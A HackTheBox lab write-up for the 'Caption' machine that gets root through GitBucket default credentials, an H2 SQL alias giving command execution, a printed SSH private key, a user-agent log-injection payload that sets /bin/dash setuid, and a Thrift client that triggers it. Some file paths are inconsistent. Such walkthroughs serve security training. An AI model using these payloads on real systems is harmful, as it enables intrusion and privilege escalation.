---
tags:
  - hack
  - linux
---
# HackTheBox: [Caption](https://app.hackthebox.com/machines/Caption)

> [!tip]- Spoiler Summary
> This machine leveraged GitBucket with default credentials (`root:root`) to access sensitive configurations and bypass path restrictions. By exploiting an SQL injection in the GitBucket interface, I achieved remote code execution and retrieved an SSH private key for the user `margo`. Privilege escalation involved exploiting a log processing service via a Thrift API, allowing me to escalate to root by manipulating log entries to execute arbitrary commands.

#### 80/tcp-http

I'm interested in these paths:

```text
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        4l        8w       94c http://caption.htb/download
403      GET        4l        8w       94c http://caption.htb/logs
302      GET        5l       22w      189c http://caption.htb/firewalls-faq => http://caption.htb/
```

#### 8080/tcp-http GitBucket

GitBucket has default credentials `root:root`:

![](_/htb-caption-20240920-1.png)

`http://caption.htb:8080/root/Caption-Portal/blob/main/config/haproxy/haproxy.cfg`:

Here are the directories I want:

```console
  acl restricted_page path_beg,url_dec -i /logs
  acl restricted_page path_beg,url_dec -i /download
```

```text
global
            log /dev/log    local0
            log /dev/log    local1 notice
            chroot /var/lib/haproxy
            stats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners
            stats timeout 30s
            user haproxy
            group haproxy
            daemon

            # Default SSL material locations
            ca-base /etc/ssl/certs
            crt-base /etc/ssl/private

            # See: https://ssl-config.mozilla.org/#server=haproxy&server-version=2.0.3&config=intermediate
            ssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
            ssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256
            ssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets

    defaults
            log     global
            mode    http
            option  httplog
            option  dontlognull
            timeout connect 5000
            timeout client  50000
            timeout server  50000
            errorfile 400 /etc/haproxy/errors/400.http
            errorfile 403 /etc/haproxy/errors/403.http
            errorfile 408 /etc/haproxy/errors/408.http
            errorfile 500 /etc/haproxy/errors/500.http
            errorfile 502 /etc/haproxy/errors/502.http
            errorfile 503 /etc/haproxy/errors/503.http
            errorfile 504 /etc/haproxy/errors/504.http


    frontend http_front
       bind *:80
       default_backend http_back
       acl restricted_page path_beg,url_dec -i /logs
       acl restricted_page path_beg,url_dec -i /download
       http-request deny if restricted_page
       acl not_caption hdr_beg(host) -i caption.htb
       http-request redirect code 301 location http://caption.htb if !not_caption

    backend http_back
       balance roundrobin
       server server1 127.0.0.1:6081 check
```

`http://caption.htb:8080/root/Caption-Portal/blob/main/config/service/varnish.service`:

```ini
[Unit]
    Description=Varnish Cache, a high-performance HTTP accelerator
    Documentation=https://www.varnish-cache.org/docs/ man:varnishd

    [Service]
    Type=simple

    # Maximum number of open files (for ulimit -n)
    LimitNOFILE=131072

    # Locked shared memory - should suffice to lock the shared memory log
    # (varnishd -l argument)
    # Default log size is 80MB vsl + 1M vsm + header -> 82MB
    # unit is bytes
    LimitMEMLOCK=85983232
    ExecStart=/usr/sbin/varnishd \
              -j unix,user=vcache \
              -F \
              -a localhost:6081 \
              -T localhost:6082 \
              -f /etc/varnish/default.vcl \
              -S /etc/varnish/secret \
              -s malloc,256m \
              -p feature=+http2
    ExecReload=/usr/share/varnish/varnishreload
    ProtectSystem=full
    ProtectHome=true
    PrivateTmp=true
    PrivateDevices=true

    [Install]
    WantedBy=multi-user.target
```

 Creds `http://caption.htb:8080/root/Caption-Portal/commit/0e3bafe458d0b821d28dde7d6f43721f479abe4a`:

![](_/htb-caption-20240920-2.png)

`margo:vFr&cS2#0!`

Those credentials work for `http://caption.htb`:

![](_/htb-caption-20240920-3.png)

Request:

```http
POST / HTTP/1.1
Host: caption.htb
Content-Length: 1
Transfer-Encoding: chunked

0
```

Response:

```http
HTTP/1.1 503 Backend fetch failed
date: Fri, 20 Sep 2024 18:18:01 GMT
server: Varnish
content-type: text/html; charset=utf-8
retry-after: 5
x-varnish: 3081494
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS
content-length: 284

<!DOCTYPE html>
<html>
  <head>
    <title>503 Backend fetch failed</title>
  </head>
  <body>
    <h1>Error 503 Backend fetch failed</h1>
    <p>Backend fetch failed</p>
    <h3>Guru Meditation:</h3>
    <p>XID: 3081495</p>
    <hr>
    <p>Varnish cache server</p>
  </body>
</html>
```

## Remote Code Execution

Using the GitBucket SQL browser, it's possible to create a malicious function to execute code:

```sql
CREATE ALIAS HAX AS $$ String shellexec(String cmd) throws java.io.IOException {
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
    return s.hasNext() ? s.next() : "";
}$$;
```

![](_/htb-caption-20240920-4.png)

```console
margo@caption:~$ cat .ssh/id_ecdsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS1zaGEy
LW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQTlvYEMXbgPL/2LQ06y0jcnmuu/FAc9u6+RLVtsYj54
iiSWDDN+QKYJIDczKObUXAvGPL+pSJLWmrBefYiXfNUnAAAAoPhh9qX4YfalAAAAE2VjZHNhLXNo
YTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOW9gQxduA8v/YtDTrLSNyea678UBz27r5EtW2xi
PniKJJYMM35ApgkgNzMo5tRcC8Y8v6lIktaasF59iJd81ScAAAAgcLzcUqapsvrlklkN7uum8K6n
4xaWByfWDZ/5uZuQzhIAAAAAAQIDBAUGBwg=
-----END OPENSSH PRIVATE KEY-----
```

MUCH SIMPLER alternative to the above:

```sql
CALL EXECVE('cat /home/margo/.ssh/id_ecdsa');
```

## Privilege Escalation

On target, `/dev/shm/x.log`:

```text
127.0.0.1 "user-agent":"'; /bin/bash /dev/shm/x.sh #"
```

On target, `/dev/shm/x.log`:

```sh
chmod +s /bin/dash
```

Forward the Thrift port:

`ssh -i id_ecdsa -L 9090:localhost:9090 margo@caption.htb`

And then, also on the attack machine:

```console
$ cat log_service.thrift
namespace go log_service

service LogService {
    string ReadLogFile(1: string filePath)
}
```

```console
sudo apt install python3-thrift
```

```console
thrift -r --gen py log_service.thrift
cd gen-py
```

`x.py`:

```python
from thrift import Thrift
from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol
from log_service import LogService  # Import generated Thrift client code

def main():
    # Set up a transport to the server
    transport = TSocket.TSocket('localhost', 9090)

    # Buffering for performance
    transport = TTransport.TBufferedTransport(transport)

    # Using a binary protocol
    protocol = TBinaryProtocol.TBinaryProtocol(transport)

    # Create a client to use the service
    client = LogService.Client(protocol)

    # Open the connection
    transport.open()

    try:
        # Specify the log file path to process
        log_file_path = "/tmp/malicious.log"

        # Call the remote method ReadLogFile and get the result
        response = client.ReadLogFile(log_file_path)
        print("Server response:", response)

    except Thrift.TException as tx:
        print(f"Thrift exception: {tx}")

    # Close the transport
    transport.close()

if __name__ == '__main__':
    main()
```

```text
$ python3 ./x.py
Server response: Log file processed
```

On target:

```console
margo@caption:/tmp$ /bin/dash -p
# id
uid=1000(margo) gid=1000(margo) euid=0(root) egid=0(root) groups=0(root),1000(margo)
# cat /root/root.txt
ac2e4c7c6a19545a9c4ce8b38cb9dc25
# chmod 755 /bin/dash
```
